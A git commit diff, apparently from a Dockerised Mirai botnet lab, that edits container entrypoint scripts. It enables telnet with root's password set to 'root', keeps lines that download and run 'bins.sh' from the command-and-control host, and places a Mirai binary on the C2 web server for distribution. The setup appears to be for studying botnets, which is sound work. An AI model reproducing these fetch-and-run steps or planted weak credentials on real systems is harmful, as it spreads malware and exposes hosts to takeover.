3e7f3857e5726c3a0d71f9a46e522a9f77189141
mattebit <matteobitussi@gmail.com>
2023-05-10 20:58:38 +0200

    added commands to docker compose

--- bot/entrypoint.sh
+++ bot/entrypoint.sh
@@ -1,3 +1,8 @@
+cd /etc/xinetd.d
+mv /home/bot/telnet .
+echo -e "root\nroot" | passwd root # change password for telnet to common ones
+service xinetd start
+
 wget cnc.mirai-lab/bins/bins.sh
 chmod u+x ./bins.sh
 ./bins.sh
--- cnc/entrypoint.sh
+++ cnc/entrypoint.sh
@@ -1,5 +1,7 @@
 service mysql start
 cat /home/tools/db.sql | mysql --user=root --password=root
+
+mv debug/mirai.dbg /var/www/html/bins/
 # start apache service
 /etc/init.d/apache2 start
 cd /home
